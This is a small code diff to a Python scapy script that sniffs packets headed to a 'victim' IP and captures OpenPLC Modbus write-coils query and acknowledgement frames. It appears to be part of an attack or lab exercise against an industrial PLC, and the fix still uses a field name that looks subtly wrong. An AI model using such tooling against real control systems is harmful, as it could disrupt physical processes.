@@ -3,7 +3,8 @@ from scapy.all import *
 flag = 1
 
 while flag:
-    OPENPLC_FRAMES = sniff(iface=your_iface, count=4, and x[IP].dest == vicim_ip)
+    OPENPLC_FRAMES = sniff(iface=your_iface, count=4, 
+                           lfilter=lambda x: IP in x and x[IP].dest == vicim_ip)
     OPENPLC_WRITE_COILS_QUERY = OPENPLC_FRAMES[2]
     OPEN_PLC_WRITE_COILS_ACK= OPENPLC_FRAMES[3]
 
